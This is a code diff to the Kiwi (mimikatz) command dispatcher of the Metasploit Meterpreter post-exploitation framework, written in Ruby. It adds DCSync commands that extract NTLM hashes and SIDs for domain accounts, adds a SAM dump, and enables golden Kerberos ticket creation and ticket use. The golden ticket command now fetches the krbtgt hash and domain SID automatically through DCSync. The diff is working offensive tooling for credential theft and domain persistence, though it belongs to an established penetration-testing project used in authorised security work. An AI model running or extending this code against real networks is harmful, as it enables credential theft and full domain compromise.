@@ -47,8 +47,8 @@ class Console::CommandDispatcher::Kiwi
     print_line
 
     if client.arch == ARCH_X86 and client.sys.config.sysinfo['Architecture'] == ARCH_X64
-      print_line
       print_warning('Loaded x86 Kiwi on an x64 architecture.')
+      print_line
     end
   end
 
@@ -58,6 +58,8 @@ class Console::CommandDispatcher::Kiwi
   def commands
     {
       'kiwi_cmd'              => 'Execute an arbitary mimikatz command (unparsed)',
+      'dcsync'                => 'Retrieve user account information via DCSync (unparsed)',
+      'dcsync_ntlm'           => 'Retrieve user account NTLM hash, SID and RID via DCSync',
       'creds_wdigest'         => 'Retrieve WDigest creds (parsed)',
       'creds_msv'             => 'Retrieve LM/NTLM creds (parsed)',
       #'creds_livessp'         => 'Retrieve LiveSSP creds',
@@ -65,11 +67,12 @@ class Console::CommandDispatcher::Kiwi
       'creds_tspkg'           => 'Retrieve TsPkg creds (parsed)',
       'creds_kerberos'        => 'Retrieve Kerberos creds (parsed)',
       'creds_all'             => 'Retrieve all credentials (parsed)',
-      #'golden_ticket_create'  => 'Create a golden kerberos ticket',
-      #'kerberos_ticket_use'   => 'Use a kerberos ticket',
+      'golden_ticket_create'  => 'Create a golden kerberos ticket',
+      'kerberos_ticket_use'   => 'Use a kerberos ticket',
       'kerberos_ticket_purge' => 'Purge any in-use kerberos tickets',
-      'kerberos_ticket_list'  => 'List all kerberos tickets',
+      'kerberos_ticket_list'  => 'List all kerberos tickets (unparsed)',
       'lsa_dump_secrets'      => 'Dump LSA secrets (unparsed)',
+      'lsa_dump_sam'          => 'Dump LSA SAM (unparsed)',
       'wifi_list'             => 'List wifi profiles/creds',
     }
   end
@@ -79,14 +82,48 @@ class Console::CommandDispatcher::Kiwi
     print_line(output)
   end
 
+  def cmd_dcsync(*args)
+    return unless check_is_domain_user
+
+    print_line(client.kiwi.dcsync(args[0]))
+  end
+
+  def cmd_dcsync_ntlm(*args)
+    return unless check_is_domain_user
+
+    user = args[0]
+    result = client.kiwi.dcsync_ntlm(user)
+    if result
+      print_good("Account   : #{user}")
+      print_good("NTLM Hash : #{result[:ntlm]}")
+      print_good("LM Hash   : #{result[:lm]}")
+      print_good("SID       : #{result[:sid]}")
+      print_good("RID       : #{result[:rid]}")
+    else
+      print_error("Failed to retrieve information for #{user}")
+    end
+    print_line
+  end
+
   #
   # Invoke the LSA secret dump on thet target.
   #
   def cmd_lsa_dump_secrets(*args)
-    check_privs
+    return unless check_is_system
 
     print_status('Dumping LSA secrets')
     print_line(client.kiwi.lsa_dump_secrets)
+    print_line
+  end
+
+  #
+  # Invoke the LSA SAM dump on thet target.
+  #
+  def cmd_lsa_dump_sam(*args)
+    return unless check_is_system
+
+    print_status('Dumping SAM')
+    print_line(client.kiwi.lsa_dump_sam)
     print_line
   end
 
@@ -95,12 +132,12 @@ class Console::CommandDispatcher::Kiwi
   #
   @@golden_ticket_create_opts = Rex::Parser::Arguments.new(
     '-h' => [ false, 'Help banner' ],
-    '-u' => [ true,  'Name of the user to create the ticket for' ],
+    '-u' => [ true,  'Name of the user to create the ticket for (required)' ],
     '-i' => [ true,  'ID of the user to associate the ticket with' ],
     '-g' => [ true,  'Comma-separated list of group identifiers to include (eg: 501,502)' ],
-    '-d' => [ true,  'Name of the target domain (FQDN)' ],
+    '-d' => [ true,  'FQDN of the target domain (required)' ],
     '-k' => [ true,  'krbtgt domain user NTLM hash' ],
-    '-t' => [ true,  'Local path of the file to store the ticket in' ],
+    '-t' => [ true,  'Local path of the file to store the ticket in (required)' ],
     '-s' => [ true,  'SID of the domain' ]
   )
 
@@ -118,51 +155,72 @@ class Console::CommandDispatcher::Kiwi
   # Invoke the golden kerberos ticket creation functionality on the target.
   #
   def cmd_golden_ticket_create(*args)
+    return unless check_is_domain_user
+
     if args.include?("-h")
       golden_ticket_create_usage
       return
     end
 
-    user = nil
-    domain = nil
-    sid = nil
-    tgt = nil
-    target = nil
-    id = 0
-    group_ids = []
+    target_file = nil
+    opts = {
+      user: nil,
+      domain_name: nil,
+      domain_sid: nil,
+      krbtgt_hash: nil,
+      user_id: nil,
+      group_ids: nil
+    }
 
     @@golden_ticket_create_opts.parse(args) { |opt, idx, val|
       case opt
       when '-u'
-        user = val
+        opts[:user] = val
       when '-d'
-        domain = val
+        opts[:domain_name] = val
       when '-k'
-        tgt = val
+        opts[:krbtgt_hash] = val
       when '-t'
-        target = val
+        target_file = val
       when '-i'
-        id = val.to_i
+        opts[:user_id] = val.to_i
       when '-g'
-        group_ids = val.split(',').map { |g| g.to_i }.to_a
+        opts[:group_ids] = val
       when '-s'
-        sid = val
+        opts[:domain_sid] = val
       end
     }
 
-    # all parameters are required
-    unless user && domain && sid && tgt && target
+    # we need the user and domain at the very least
+    unless opts[:user] && opts[:domain_name] && target_file
       golden_ticket_create_usage
       return
     end
 
-    ticket = client.kiwi.golden_ticket_create(user, domain, sid, tgt, id, group_ids)
+    # is anything else missing?
+    unless opts[:domain_sid] && opts[:krbtgt_hash]
+      # let's go discover it
+      krbtgt_username = opts[:user].split('\\')[0] + '\\krbtgt'
+      dcsync_result = client.kiwi.dcsync_ntlm(krbtgt_username)
+      unless opts[:krbtgt_hash]
+        opts[:krbtgt_hash] = dcsync_result[:ntlm]
+        print_warning("NTLM hash for krbtgt missing, using #{opts[:krbtgt_hash]} extracted from #{krbtgt_username}")
+      end
 
-    ::File.open( target, 'wb' ) do |f|
+      unless opts[:domain_sid]
+        domain_sid = dcsync_result[:sid].split('-')
+        opts[:domain_sid] = domain_sid[0, domain_sid.length - 1].join('-')
+        print_warning("Domain SID missing, using #{opts[:domain_sid]} extracted from SID of #{krbtgt_username}")
+      end
+    end
+
+    ticket = client.kiwi.golden_ticket_create(opts)
+
+    ::File.open(target_file, 'wb') do |f|
       f.write(ticket)
     end
 
-    print_good("Golden Kerberos ticket written to #{target}")
+    print_good("Golden Kerberos ticket written to #{target_file}")
   end
 
   #
@@ -208,6 +266,7 @@ class Console::CommandDispatcher::Kiwi
     }
 
     tickets = client.kiwi.kerberos_ticket_list(export)
+    print_line(tickets)
 
     fields = ['Server', 'Client', 'Start', 'End', 'Max Renew', 'Flags']
     fields << 'Export Path' if export
@@ -387,21 +446,23 @@ class Console::CommandDispatcher::Kiwi
 
 protected
 
-  def check_privs
-    if system_check
-      print_good('Running as SYSTEM')
-    else
-      print_warning('Not running as SYSTEM, execution may fail')
-    end
-  end
-
-  def system_check
-    unless client.sys.config.is_system?
-      print_warning('Not currently running as SYSTEM')
+  def check_is_domain_user
+    if client.sys.config.is_system?
+      print_warning('Running as SYSTEM, function will not work.')
       return false
     end
 
-    return true
+    true
+  end
+
+  def check_is_system
+    if client.sys.config.is_system?
+      print_good('Running as SYSTEM')
+      return true
+    end
+
+    print_warning('Not running as SYSTEM, execution may fail')
+    false
   end
 
   #
@@ -420,7 +481,7 @@ protected
       return
     end
 
-    check_privs
+    return unless check_is_system
     print_status("Retrieving #{provider} credentials")
     accounts = method.call
     output = ""
